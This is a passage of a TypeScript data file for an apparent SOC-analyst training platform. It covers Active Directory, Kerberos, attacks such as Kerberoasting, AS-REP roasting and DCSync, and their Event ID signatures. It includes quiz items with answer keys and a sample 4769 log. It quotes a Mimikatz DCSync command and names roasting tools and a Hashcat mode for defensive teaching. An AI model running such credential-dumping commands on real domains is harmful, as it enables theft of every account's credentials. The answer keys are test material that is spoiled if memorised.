/**
 * Learning Rooms — Batch 03
 * Active Directory, Windows Event Logs, Linux Fundamentals, Linux Log Analysis
 *
 * Four intermediate-to-beginner rooms covering identity infrastructure,
 * Windows audit trail, and Linux fundamentals for SOC analysts.
 */

import type { TelemetryEvent } from "@/lib/sim/types";
import type {
  Room,
  ReadingTask,
  QuestionTask,
  LogAnalysisTask,
  FlagTask,
  AnalystChoiceTask,
} from "@/data/rooms";

// ---------------------------------------------------------------------------
// Room 1 — Active Directory Fundamentals
// ---------------------------------------------------------------------------

const activeDirectory: Room = {
  id: "active-directory",
  title: "Active Directory Fundamentals",
  description:
    "Understand the identity backbone of every Windows enterprise: domain controllers, Kerberos authentication, GPOs, and the attack techniques that target them. Learn what to monitor as a SOC analyst.",
  difficulty: "intermediate",
  category: "Identity",
  estimatedMinutes: 50,
  xp: 425,
  icon: "🏢",
  // windows-event-logs is required, not optional: this room quotes Event IDs
  // (4768/4769/4624/4625) from its first reading onward and assumes the student
  // already knows what a Windows Event ID is, what the Security channel is, and
  // that auditing has to be switched on to produce any of it. All of that is
  // taught in windows-event-logs, which windows-fundamentals only touches in
  // passing.
  prerequisites: ["windows-fundamentals", "windows-event-logs"],
  tasks: [
    // -------------------------------------------------------------------------
    // Reading 1 — What is Active Directory?
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "ad-r1",
      heading: "What Is Active Directory — and Why Does Every Company Use It?",
      content: `Imagine a large company with 2,000 employees. Each employee needs to log in to their computer, access shared folders on the file server, print to the office printer, and open the HR application. Without any central system, an IT administrator would have to create a separate account on every single computer, every server, and every application for every employee — 2,000 accounts multiplied by dozens of systems. Changing one person's password or revoking access when they leave the company would be a nightmare.\n\n**Active Directory (AD)** solves this problem. Think of it as the company's central HR department combined with a master security badge system. Every employee gets one account in Active Directory. That single account controls what they can log in to, what files they can open, what printers they can use, and what applications they can access — everywhere in the company. When an employee leaves, IT disables their one AD account and access is revoked everywhere instantly.\n\nMicrosoft introduced Active Directory in Windows 2000, and it now runs in the vast majority of enterprises worldwide. As a SOC analyst, almost every investigation you do in a Windows environment will touch Active Directory in some way. Understanding it is not optional — it is foundational.\n\n**Domain vs. Workgroup**\n\nWindows computers can operate in one of two modes:\n\n- **Workgroup**: Each computer manages its own accounts locally. Fine for home use or a tiny office of 3–5 people. There is no central control. If you change your password on your laptop, it has no effect on your desktop PC.\n- **Domain**: All computers are joined to a central directory (Active Directory). One account works everywhere. IT can enforce policies on all machines from a single location. This is how every company with more than a handful of staff operates.\n\n**The Domain Controller (DC) — The Brain of AD**\n\nA **Domain Controller** is a Windows Server that runs Active Directory Domain Services (AD DS). It is the most critical server in the entire company. Here is what it does:\n\n- Stores the directory database — every user account, computer account, and group\n- Authenticates users when they log in (are you who you say you are?)\n- Authorises access (are you allowed to open that file?)\n- Runs the **Kerberos Key Distribution Center (KDC)** — the authentication engine\n- Hosts the **SYSVOL** share — where Group Policy settings are stored and replicated\n\nIf the Domain Controller goes down, users cannot log in to new sessions, printers stop working, and shared drives become inaccessible. This is why companies always have at least two Domain Controllers for redundancy, and why attackers target them so aggressively. Compromising a DC typically means owning the entire company.\n\n**Forest, Domain, Organizational Units (OUs)**\n\nActive Directory has a hierarchical structure, like a set of nested containers:\n\n- **Forest**: The outermost boundary. A forest can contain one or more domains. The first domain created is the **forest root domain**. All domains in a forest share a common schema (the list of attribute types that objects can have) and a Global Catalog.\n- **Domain**: The main administrative unit. Has a DNS name like **corp.contoso.com**. Users, computers, and groups live inside domains.\n- **Domain Tree**: Multiple domains sharing a contiguous DNS namespace (e.g., contoso.com with child domains us.contoso.com and eu.contoso.com form a tree).\n- **Organizational Units (OUs)**: Folders inside a domain used to organise objects. A company might have OUs for each department: IT, Finance, HR, Marketing. OUs are important because **Group Policies can be applied to an OU**, affecting all objects inside it.\n\n**Users, Computers, and Groups**\n\nThree core object types live in Active Directory:\n\n- **User objects**: Represent people. Have a username (sAMAccountName like j.smith), a password, email, phone number, department, and dozens of other attributes.\n- **Computer objects**: Every Windows PC or server joined to the domain gets a computer object in AD. This allows policies to be applied to machines, not just people.\n- **Group objects**: Collections of users and/or computers. Two types matter:\n  - **Security Groups**: Used for access control. Add a user to the "Finance" security group and they automatically gain access to finance file shares. Remove them from the group and access is revoked immediately.\n  - **Distribution Groups**: Used only for email distribution lists in Exchange/Outlook. They do NOT control access to anything. A common beginner mistake is confusing these two.\n\n**Group Policy Objects (GPOs)**\n\nGroup Policy is AD's remote configuration and enforcement system. A **GPO** is a collection of settings that Active Directory pushes down to computers and users. Examples:\n\n- Force all computers to lock the screen after 5 minutes of inactivity\n- Require passwords to be at least 12 characters long\n- Prevent users from installing software\n- Map a network drive automatically when a user logs in\n- Deploy software updates\n\nGPOs are linked to OUs, domains, or sites. Every time a user logs in or a computer starts up, it contacts the DC and applies any GPOs that apply to it. This is a common attacker target: if an attacker can modify a GPO linked to "All Computers", they can push a malicious script to every machine in the company simultaneously.\n\n**Trust Relationships**\n\nSometimes two separate domains or forests need to let their users access each other's resources. This is done with **trusts**:\n\n- **One-way trust**: Domain A trusts Domain B. Users in B can access resources in A, but not vice versa.\n- **Two-way trust**: Both domains trust each other's users.\n- **Transitive trust**: If A trusts B and B trusts C, then A implicitly trusts C. All trusts within a forest are automatically transitive.\n\nTrusts can be dangerous if misconfigured — a compromise in a less-secure trusted domain can be a path into a more-secure domain.`,
      checkpoint: {
        question:
          "Every user in the company suddenly fails to sign in to new sessions and no one can obtain Kerberos tickets, yet the file servers themselves are still running. Which Domain Controller function has stopped working?",
        options: [
          "The Kerberos Key Distribution Center (KDC)",
          "The Organizational Unit (OU) hierarchy",
          "The SYSVOL share holding Group Policy",
          "The schema shared across the forest",
        ],
        answer: 0,
        explanation:
          "The KDC is the authentication engine on the Domain Controller: it checks who you are and issues the Kerberos tickets, so when it fails nobody can authenticate. The OU hierarchy only organises objects so GPOs can be targeted; it does not authenticate anyone. SYSVOL stores and replicates Group Policy settings — losing it would stop policies applying, not stop ticket issuance. The schema is the list of attribute types objects can have; it defines structure, not logons.",
      },
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 2 — Kerberos Authentication Deep Dive
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "ad-r2",
      heading: "Kerberos Authentication — How AD Proves Who You Are",
      content: `When you type your username and password at a Windows login screen, you are starting a process called **Kerberos authentication**. Kerberos is a network authentication protocol invented at MIT in the 1980s and still the primary authentication method in Active Directory today. Understanding it is critical because many of the most dangerous AD attacks specifically target the Kerberos system.\n\nThe analogy: imagine a theme park. When you arrive, you show your ID at the front gate (the KDC). The gate gives you a **wristband** (a Kerberos ticket). For the rest of the day, you show your wristband to get into individual rides (services) without showing your ID again. The wristband proves the gate already checked you.\n\n**The Key Players**\n\n- **KDC (Key Distribution Center)**: Runs on every Domain Controller. Has two components: the **Authentication Server (AS)** and the **Ticket-Granting Service (TGS)**. The KDC knows the secret keys of every user and service in the domain.\n- **TGT (Ticket-Granting Ticket)**: A ticket you receive after proving your password. This is your wristband. It proves to the KDC that you already authenticated. TGTs are typically valid for 10 hours.\n- **Service Ticket / TGS ticket**: A ticket for a specific service (like the file server or the web application). Obtained by presenting your TGT.\n\n**Step-by-Step Kerberos Flow**\n\n**Step 1 — AS-REQ (Authentication Service Request)**\nYour computer sends an AS-REQ to the KDC saying "I am user j.smith". It includes a timestamp encrypted with a key derived from j.smith's password. This proves you know the password without sending the password over the network.\n\n**Step 2 — AS-REP (Authentication Service Response)**\nIf the KDC validates the encrypted timestamp, it sends back a **TGT** encrypted with the KDC's own secret key (the krbtgt account key). Only the KDC can read or forge a TGT. The KDC also sends a session key your computer can use for further communication.\nWindows Event ID **4768** is logged when a TGT is issued.\n\n**Step 3 — TGS-REQ (Ticket-Granting Service Request)**\nWhen you try to access a service (say, the file server FS01), your computer presents your TGT to the KDC and says "I need a ticket for the CIFS service on FS01".\n\n**Step 4 — TGS-REP (Ticket-Granting Service Response)**\nThe KDC returns a **Service Ticket** encrypted with the file server's secret key. Your computer cannot read this ticket — only FS01 can.\nWindows Event ID **4769** is logged when a service ticket is issued.\n\n**Step 5 — AP-REQ (Application Request)**\nYour computer sends the service ticket to FS01. FS01 decrypts it with its own key, reads your identity and privileges, and decides whether to let you in. No password ever crosses the wire after step 1.\n\n**Why Kerberos Tickets Are Attack Targets**\n\nBecause Kerberos tickets are the proof of identity, stealing or forging them bypasses the need for passwords entirely:\n\n- **Pass-the-Ticket**: An attacker steals a valid TGT from memory (using tools like Mimikatz) and injects it into their own session. They become that user without knowing their password.\n- **Kerberoasting**: Service tickets for accounts that run services are encrypted with the service account's password key. An attacker requests a service ticket for a high-privilege service account, takes the encrypted blob offline, and uses a password cracker to brute-force the original password. Any domain user can request service tickets, so this attack requires no special privileges.\n  - Indicator: **EncryptionType 0x17 (RC4-HMAC)** in Event ID 4769. Modern environments use AES (0x11 = AES-128 / 0x12 = AES-256). RC4 ticket requests are highly suspicious because attackers prefer RC4 — it is faster to crack.\n- **Golden Ticket**: The KDC signs all TGTs with the **krbtgt** account password. If an attacker can extract the krbtgt password hash (which requires DC-level access), they can forge TGTs for any user, including fake accounts, with any expiry time — even years in the future. This is one of the most powerful attacks in Windows environments.\n- **Silver Ticket**: Instead of forging a TGT, the attacker forges a service ticket directly using the service account's password hash. More limited in scope but harder to detect because it never touches the KDC.\n\n**LDAP — Querying Active Directory**\n\n**LDAP (Lightweight Directory Access Protocol)** is the protocol used to query and modify the Active Directory database. Every time something looks up a user's details, checks group membership, or searches for computers, it uses LDAP.\n\nLDAP queries follow a format like: \`(objectClass=user)(sAMAccountName=j.smith)\`\n\n**Attackers use LDAP enumeration** (tools like BloodHound, ldapsearch, or ADExplorer) to map the entire AD environment — all users, all groups, all trust relationships, all GPOs. This gives them a roadmap for privilege escalation before they ever touch a sensitive system. Seeing large volumes of LDAP queries from an unusual host or service account is a red flag.\n\n**DCSync — The Most Dangerous AD Attack**\n\nDomain Controllers replicate their data to each other using the **Directory Replication Service (DRS) protocol**. An attacker with specific permissions (DS-Replication-Get-Changes) can impersonate a Domain Controller and request a copy of all password hashes from the real DC. This is called **DCSync**. With all password hashes, the attacker owns every account in the domain. Mimikatz can perform DCSync with the command \`lsadump::dcsync /user:krbtgt\`. Event ID **4662** with the specific GUID for replication rights is the indicator.`,
      checkpoint: {
        question:
          "At 08:00 j.smith signs in to her domain workstation. At 08:05 she opens the share \\\\FS01\\finance for the first time that day. Which event on the Domain Controller records the 08:05 step?",
        options: ["4768", "4769", "4624", "4672"],
        answer: 1,
        explanation:
          "Opening the share means her computer presents its TGT and asks the KDC for a service ticket for FS01 (TGS-REQ/TGS-REP), which the DC logs as 4769. 4768 is the earlier 08:00 step, when she proved her password and received the TGT. 4624 is a logon event, and for the share access it is written on FS01 itself, not by the KDC on the DC. 4672 records special privileges assigned at an admin logon and has nothing to do with requesting a service ticket.",
      },
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 3 — AD Attack Techniques and What to Monitor
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "ad-r3",
      heading: "AD Attack Techniques and SOC Monitoring",
      content: `Active Directory is the crown jewel of nearly every Windows enterprise. Attackers know this — compromising AD means compromising the whole company. As a SOC analyst, you need to know both the attack techniques and the log signatures that reveal them.\n\n**Pass-the-Hash (PtH)**\nWindows can authenticate users using just the **NTLM hash** of their password — the scrambled version stored on disk — without ever knowing the original password. Tools like Mimikatz can dump these hashes from memory. An attacker with a hash can authenticate as that user across the network.\n- Detection: Event ID **4624 with LogonType 3** (network logon) from unexpected sources, especially for privileged accounts. High volume from a single source.\n\n**Pass-the-Ticket (PtT)**\nAn attacker extracts a valid Kerberos TGT from a compromised machine's memory and imports it into their own session, becoming that user.\n- Detection: Unusual Kerberos ticket activity, tickets being used from different IP addresses than where they were issued.\n\n**Kerberoasting**\nAny domain user can request a Kerberos service ticket for any service. The ticket is encrypted with the service account's password hash. Offline cracking reveals the password.\n- Detection: Event ID **4769** with EncryptionType **0x17** (RC4), especially for high-value service accounts. Multiple 4769 events from one user requesting tickets for many different services.\n\n**Golden Ticket**\nWith the **krbtgt** account hash, an attacker can forge any TGT for any user with any expiry.\n- Detection: Extremely difficult to detect without specialised tools. Look for tickets with unusually long lifetimes, or tickets for accounts that don't exist. Microsoft ATA and Microsoft Defender for Identity (MDI) have specific detections.\n\n**DCSync**\nImpersonating a DC to replicate all password hashes.\n- Detection: Event ID **4662** (access to directory service object) with properties containing the GUIDs for **DS-Replication-Get-Changes** and **DS-Replication-Get-Changes-All**, from an account that is NOT a known Domain Controller.\n\n**BloodHound Enumeration**\nThe BloodHound tool maps all AD relationships (group memberships, admin rights, trust paths) to find the shortest path to Domain Admin.\n- Detection: Large volumes of LDAP queries from a single workstation, especially queries for group memberships, ACLs, and SPNs. Microsoft Defender for Identity alerts on this specifically.\n\n**What SOC Analysts Should Monitor in AD**\n\n- **Event ID 4768**: Kerberos TGT requested. Watch for RC4 encryption (EncryptionType 0x17) and failures.\n- **Event ID 4769**: Kerberos service ticket requested. Watch for RC4 and high-volume requests.\n- **Event ID 4625**: Failed logon. Multiple failures from one source = brute force or spray.\n- **Event ID 4624 LogonType 3**: Network logon. Lateral movement typically uses this type.\n- **Event ID 4720**: User account created. Any new account is worth verifying.\n- **Event ID 4728 / 4732**: User added to a security group. Addition to Domain Admins or similar is critical.\n- **Event ID 4672**: Special privileges assigned at logon. This fires for every admin logon.\n- **Event ID 4662**: Directory service object access. DCSync detection.\n- **Event ID 4776**: NTLM authentication attempt. Pass-the-Hash often uses NTLM.\n- **Event ID 1102**: Audit log cleared. Attackers clear logs to hide their tracks.\n\n**Principle of Least Privilege in AD**\nA healthy AD environment follows the principle that users and service accounts should have only the minimum permissions they need. Signs of poor AD hygiene that attackers exploit:\n- Service accounts with Domain Admin rights (Kerberoasting becomes catastrophic)\n- Users in multiple admin groups\n- GPOs delegated to non-admin users\n- Stale accounts that were never disabled when employees left\n\nAs a SOC analyst, when you see a high-privilege account doing something unusual — especially from a workstation rather than a server — treat it as a priority alert.`,
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Question 1
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "ad-q1",
      question:
        "A company with 5,000 employees needs a way to manage all user accounts centrally so that one account works on all systems and IT can enforce password policies everywhere. Which Windows infrastructure does this?",
      options: [
        "A Workgroup with the same local account created on every PC",
        "Active Directory Domain Services running on a Domain Controller",
        "A DNS server with secure dynamic updates for every machine",
        "WSUS pushing configuration and account settings to every PC",
      ],
      answer: 1,
      explanation:
        "Active Directory Domain Services (AD DS), running on Domain Controllers, provides centralised identity management. One account per user works across all domain-joined systems, and Group Policy enforces settings on all machines simultaneously. A Workgroup has no central control — the same local account on every PC is still 5,000 separate accounts, and a password change on one machine does nothing on the others. A DNS server resolves names to addresses; it does not hold user accounts or enforce password policy. WSUS distributes Windows updates, not identities or account settings.",
      xp: 20,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Question 2 — Kerberos flow
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "ad-q2",
      question:
        "In step 4 of the Kerberos flow, the KDC returns a service ticket for the CIFS service on FS01. Which key is that ticket encrypted with, and who can therefore read it?",
      options: [
        "The krbtgt account's key — only the KDC can read the ticket",
        "FS01's own secret key — only the file server can decrypt it",
        "The user's password-derived key — the user's PC decrypts it",
        "The AS-REP session key — both the PC and the KDC can read it",
      ],
      answer: 1,
      explanation:
        "The service ticket is encrypted with the secret key of the service it is for (FS01), so the client just carries it and only FS01 can open it, read the user's identity and decide access. This is also why Kerberoasting works: a ticket for a service account is encrypted with that account's password-derived key and can be cracked offline. The krbtgt key encrypts the TGT, not service tickets. The user's password-derived key is used in step 1 for the pre-authentication timestamp. The session key lets the PC and the KDC talk securely, but the service ticket itself is sealed for the service.",
      xp: 25,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Question 3 — Kerberoasting indicator
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "ad-q3",
      question:
        "You are reviewing Event ID 4769 logs (Kerberos Service Ticket requests). Which field and value is the primary indicator of a Kerberoasting attack?",
      options: [
        "TicketEncryptionType 0x12 (AES-256) on tickets for service accounts",
        "TicketEncryptionType 0x17 (RC4-HMAC) on tickets for service accounts",
        "Status 0x12 (account disabled) on repeated service ticket requests",
        "ServiceName krbtgt on repeated service ticket requests",
      ],
      answer: 1,
      explanation:
        "Kerberoasting works by requesting service tickets encrypted with RC4 (EncryptionType 0x17) because RC4 is much faster to crack offline than AES. Modern Windows environments default to AES (0x11 = AES-128, 0x12 = AES-256), so 0x12 is the normal, expected value rather than a warning sign. 'Status 0x12' on 4769 is a failure code (the account is disabled or locked), so no crackable ticket was issued. Tickets whose ServiceName is krbtgt are routine TGT renewals, not service tickets for a service account. Seeing RC4 ticket requests for service accounts — especially many from one requester — is the Kerberoasting indicator.",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Log Analysis — Kerberos TGT with suspicious encryption
    // -------------------------------------------------------------------------
    {
      type: "log_analysis",
      id: "ad-la1",
      heading: "Suspicious Kerberos Ticket Request",
      context:
        "Your SIEM has alerted on an unusual Kerberos activity on the Domain Controller. A user account has requested a Kerberos service ticket with an older encryption type. Review the event below and answer the questions.",
      event: {
        id: "ad-evt-001",
        ts: "2024-11-14T02:17:33.000Z",
        source: "ad",
        vendor: "Windows Security",
        event_type: "kerberos_tgs",
        severity: "high",
        hostname: "DC01.corp.contoso.com",
        description:
          "Kerberos Service Ticket request with RC4 encryption — possible Kerberoasting",
        mitre_technique: "T1558.003",
        mitre_tactic: "Credential Access",
        authentication: {
          method: "Kerberos",
          result: "Success",
          logon_type: 3,
        },
        raw: {
          "event.code": "4769",
          "winlog.channel": "Security",
          "winlog.computer_name": "DC01.corp.contoso.com",
          // 4769 field roles, per Microsoft's schema — these were previously
          // swapped here, which taught the wrong field to filter a Kerberoasting
          // hunt on. TargetUserName is the account that REQUESTED the ticket;
          // ServiceName is the account the ticket was requested FOR (the
          // Kerberoast target). There is no RequestorName field on 4769.
          "winlog.event_data.TargetUserName": "j.harrison@CORP.CONTOSO.COM",
          "winlog.event_data.TargetDomainName": "CORP.CONTOSO.COM",
          "winlog.event_data.ServiceName": "svc_sqlbackup",
          "winlog.event_data.TicketEncryptionType": "0x17",
          "winlog.event_data.TicketOptions": "0x40810000",
          "winlog.event_data.Status": "0x0",
          "winlog.event_data.IpAddress": "10.10.25.88",
          "winlog.event_data.IpPort": "54321",
          "winlog.event_id": 4769,
          "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
          "@timestamp": "2024-11-14T02:17:33.000Z",
        },
      } satisfies TelemetryEvent,
      questions: [
        {
          question:
            "What is the name of the service account whose ticket was requested, and why is that significant?",
          options: [
            "j.harrison — TargetUserName names the account the ticket was issued for, so that is the roast target",
            "svc_sqlbackup — a SQL backup service account, likely privileged, so a high-value Kerberoast target",
            "DC01 — ServiceName names the Domain Controller that issued the ticket, so the DC is under attack",
            "CORP.CONTOSO.COM — the realm in TargetDomainName is the entity being roasted, as tickets are per-realm",
          ],
          answer: 1,
          explanation:
            "Read the two account fields in the right order — this is the single most confused pair on 4769. ServiceName is the account the ticket was requested FOR: 'svc_sqlbackup'. TargetUserName is the account that REQUESTED it: 'j.harrison@CORP.CONTOSO.COM'. So svc_sqlbackup is the Kerberoasting target, and j.harrison is the requester who may itself be a compromised account. Service accounts like svc_sqlbackup often carry weak, never-rotated passwords and elevated privileges — an attacker requests a service ticket encrypted with that account's password hash, then cracks it offline. When you hunt Kerberoasting you filter on ServiceName (which service accounts are being asked for) and pivot on TargetUserName (who keeps asking); getting them the wrong way round sends the whole investigation at the wrong account.",
          xp: 30,
        },
        {
          question:
            "You hunt in the DC's logs around this event. Which additional finding would most strengthen the Kerberoasting hypothesis?",
          options: [
            "A 4768 for j.harrison with PreAuthType 2, from the same host, a minute before this event",
            "More 4769s from the same source host within minutes, each for a different service account, in RC4",
            "A 4769 for svc_sqlbackup in AES (0x12), requested by the SQL server's own computer account",
            "A 4672 for j.harrison at 02:17, showing special privileges were assigned at the logon",
          ],
          answer: 1,
          explanation:
            "Kerberoasting tools usually ask for tickets for many service accounts in one burst, and ask for RC4 because it cracks faster — so a run of RC4 4769s from the same host for different ServiceNames turns one odd request into a pattern. A 4768 with PreAuthType 2 just before is expected: the requester needs a TGT before any service ticket, so it proves nothing either way. An AES 4769 from the SQL server's own account is the normal, healthy pattern for that service. A 4672 would mean j.harrison logged on with admin-level privileges — worth noting, but it is not part of the Kerberoasting signature, which needs no special privileges at all. The 02:17 timing matters too: a human user account asking for an RC4 ticket to a backup service account in the middle of the night fits neither the user nor the job.",
          xp: 35,
        },
      ],
    } satisfies LogAnalysisTask,

    // -------------------------------------------------------------------------
    // Question 4 — Groups
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "ad-q4",
      question:
        "An IT admin creates a group in Active Directory and adds all Finance department users to it, giving the group Read/Write access to the Finance file share. What type of AD group is this?",
      options: [
        "Distribution Group — can be added to a share's ACL to grant access",
        "Security Group — can be placed on ACLs to grant access to resources",
        "Organizational Unit — grants its permissions to every account placed in it",
        "Built-in Group — a predefined group that admins cannot create themselves",
      ],
      answer: 1,
      explanation:
        "Security Groups are the AD group type used to control access to resources like file shares, printers, and applications. Distribution Groups are only used for email distribution lists and cannot be assigned permissions, so they cannot grant share access. An OU is a folder for organising objects and targeting GPOs; it is not a group and does not grant resource permissions to its members. Built-in Groups are predefined, which is true, but this group was created by the admin for Finance. If a group controls access to anything, it is a Security Group.",
      xp: 20,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Question 5 — DCSync
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "ad-q5",
      question:
        "DC01 logs Event ID 4662 for the domain object. The properties accessed include the GUIDs for DS-Replication-Get-Changes and DS-Replication-Get-Changes-All, and the account is 'svc-backup', which is not a Domain Controller. What does this most likely show?",
      options: [
        "Routine replication — 4662 with these GUIDs is what DCs log whenever they sync",
        "DCSync — the account is replicating like a DC to pull every account's password hash",
        "AdminSDHolder abuse — the account is rewriting ACLs on the protected admin groups",
        "Golden Ticket use — the account is presenting a forged TGT to the DC for access",
      ],
      answer: 1,
      explanation:
        "4662 with both replication-rights GUIDs from an account that is NOT a known Domain Controller is the DCSync detection taught in this room: the account is using the DC replication protocol (DRS) to request password hashes — including krbtgt — without logging on to the DC, which hands over every credential in the domain. 'Routine replication' would be true only if the requester were a DC; svc-backup is not. AdminSDHolder abuse is about writing permissions on protected groups, not reading replication data. A Golden Ticket is a forged TGT presented for access; it does not appear as replication-rights access on the domain object (and the krbtgt hash it needs is exactly what a DCSync can steal).",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Flag Task
    // -------------------------------------------------------------------------
    {
      type: "flag",
      id: "ad-flag1",
      prompt:
        "In the Kerberos ticket event above (Event ID 4769), find the network address of the machine that asked for the RC4 ticket — the host you would examine next for the tool that made the request. Enter the IP address.",
      answer: "10.10.25.88",
      hint: "The DC records where each ticket request came from, not only who made it.",
      xp: 40,
    } satisfies FlagTask,

    // -------------------------------------------------------------------------
    // Question 6 — Golden Ticket
    // -------------------------------------------------------------------------
    {
      type: "question",
      id: "ad-q6",
      question:
        "What makes a Golden Ticket attack so uniquely dangerous compared to other Kerberos attacks?",
      options: [
        "It forges tickets for one account at a time and needs that user's current password hash",
        "It forges service tickets with a service account's hash, so it only reaches that one service",
        "It signs forged TGTs with the krbtgt hash for any account, and survives user password resets",
        "It abuses a DC replication permission to pull every hash, and ends once that permission is removed",
      ],
      answer: 2,
      explanation:
        "The krbtgt account is used to sign all TGTs in the domain. If an attacker obtains its hash (via DCSync or extracting it from DC memory), they can forge TGTs for any user — real or fictional — with any expiry date and any privileges. Even resetting all user passwords does not help, because the Golden Ticket is signed with krbtgt's key, not the user's key. The only remediation is resetting the krbtgt password twice (to invalidate all outstanding tickets). 'One account at a time with that user's current hash' describes Pass-the-Hash, not forging with krbtgt. 'Service tickets with a service account's hash' is a Silver Ticket, limited to one service. 'Abuses a replication permission to pull every hash' is DCSync — often the way the krbtgt hash is stolen, but a different technique.",
      xp: 30,
    } satisfies QuestionTask,

    // -------------------------------------------------------------------------
    // Reading 4 — AS-REP Roasting (Kerberoasting's quieter sibling)
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "ad-r4",
      heading: "AS-REP Roasting — Attacking Accounts With Pre-Authentication Disabled",
      content: `You already learned Kerberoasting: an attacker requests a service ticket (TGS) for a service account and cracks the encrypted reply offline. **AS-REP Roasting** is Kerberoasting's quieter sibling — it targets the very first step of Kerberos authentication instead, and it works without the attacker ever needing to authenticate at all.\n\nRecall from Reading 2: the normal Kerberos flow starts with an **AS-REQ**, where your computer proves it knows your password by sending the KDC a timestamp encrypted with a key derived from that password. This encrypted timestamp is called **Kerberos pre-authentication**, and it exists specifically to stop an attacker from requesting a TGT for an account without knowing that account's password first.\n\n**The vulnerability: pre-authentication can be disabled.** Every AD user account has an attribute called 'DONT_REQ_PREAUTH' (visible in AD as the "Do not require Kerberos preauthentication" checkbox under the account's Account tab). When this flag is set, the KDC will hand out an **AS-REP** (the encrypted TGT reply) to *anyone* who asks for that specific username — no password, no proof of identity, nothing. This setting is rare in a well-run domain, but it turns up more often than you'd expect: legacy applications that predate modern Kerberos tooling, accounts migrated from older domains, or simple misconfiguration.\n\n**How the attack works, step by step:**\n1. The attacker does **not** need any credentials or domain access beyond basic network connectivity to a Domain Controller — this can even be run pre-authentication from an unauthenticated position in some configurations, but is most commonly run by an attacker who already has a low-privilege foothold and wants to escalate quietly.\n2. Using a tool like Impacket's 'GetNPUsers.py' or Rubeus's 'asreproast' module, the attacker requests a list of usernames — pulled from earlier LDAP enumeration — and asks the KDC for an AS-REP for each one.\n3. For any account with 'DONT_REQ_PREAUTH' set, the KDC replies immediately with an AS-REP. Part of that reply — the encrypted portion — is encrypted using a key derived from the target account's password (RC4-HMAC in older/misconfigured domains, which is fast to crack; AES in hardened domains, which is much slower).\n4. The attacker takes this encrypted blob **offline** and runs it through a password cracker (Hashcat mode 18200, or John the Ripper). Because there is no live connection to the KDC during cracking, there is **no lockout, no rate limit, and no additional log entries** — the entire cracking process is invisible to the SOC.\n5. Once cracked, the attacker has that account's plaintext password and can log in normally — which is where the attack chain becomes visible again.\n\n**Why AS-REP Roasting is dangerous specifically because it's quiet:** Kerberoasting requires requesting a *service* ticket (Event ID 4769), which at least proves the requesting account was authenticated. AS-REP Roasting requests happen at the very first, pre-authentication stage — before any password is checked — so a successful roast against a vulnerable account produces exactly **one** Kerberos event (an Event ID 4768 AS-REQ/AS-REP exchange) with nothing else to correlate against. The actual password cracking that follows generates **zero logs of any kind**, because it happens entirely on the attacker's own machine.\n\n**The detection signature — Event ID 4768, field PreAuthType:** When a Domain Controller issues a TGT, it logs Event ID 4768 (the same event ID used for every normal, legitimate login). The field that tells you whether pre-authentication was actually used is **PreAuthType**:\n- **PreAuthType = 2** — Normal: the client proved knowledge of the password with an encrypted timestamp. This is what 99% of your 4768 events should look like.\n- **PreAuthType = 0** — No pre-authentication was used. Either this is a legitimately misconfigured account being probed by an attacker, or — even worse — you are looking at an actual AS-REP Roasting attempt in progress.\n\nA single 4768 with PreAuthType 0 for an account that should never have that flag set is a strong indicator someone just requested a roastable AS-REP. If the *same account* generates a normal, PreAuthType=2 login hours later from a different, unrelated host, that gap is consistent with offline cracking having succeeded in between.\n\n**Prevention and remediation:** Audit AD for any account with 'DONT_REQ_PREAUTH' set (the PowerShell cmdlet 'Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}') and disable the flag unless there is a documented legacy-application reason for it. For any account that must keep it disabled, enforce a long, high-entropy password so offline cracking is infeasible even with the AS-REP in hand.`,
      checkpoint: {
        question:
          "At 01:10 the DC logs a 4768 for 'svc-legacy-print' with PreAuthType 0 from 10.1.9.77, a host that has never used that account. At 06:40 the same account gets a 4768 with PreAuthType 2 from a different, unrelated server. What does this sequence suggest?",
        options: [
          "Nothing yet — offline cracking would show up as failed logons on the DC, and none appear",
          "The AS-REP may have been cracked offline in between, and the account is now in use elsewhere",
          "The 06:40 event is the attacker retrying after the roast failed, so the password is still safe",
          "PreAuthType 2 at 06:40 means the DC refused that request, so the account was not actually used",
        ],
        answer: 1,
        explanation:
          "PreAuthType 0 from an unexpected host is the roastable AS-REP being handed out; a later PreAuthType 2 logon from an unrelated host means someone proved they know the password — the gap fits offline cracking that succeeded. 'Cracking would show failed logons' is the key misconception: cracking happens on the attacker's own machine and produces no logs at all. 'The roast failed and this is a retry' misreads PreAuthType 2, which means the client proved knowledge of the password with an encrypted timestamp. 'PreAuthType 2 means refused' is also wrong — 4768 records a TGT that was issued, and 2 is the normal, successful pre-authentication value.",
      },
    } satisfies ReadingTask,

    // -------------------------------------------------------------------------
    // Reading 5 — LLMNR/NBT-NS Poisoning and NTLM Relay
    // -------------------------------------------------------------------------
    {
      type: "reading",
      id: "ad-r5",
      heading: "LLMNR/NBT-NS Poisoning and NTLM Relay — Stealing Authentication Without Cracking Anything",
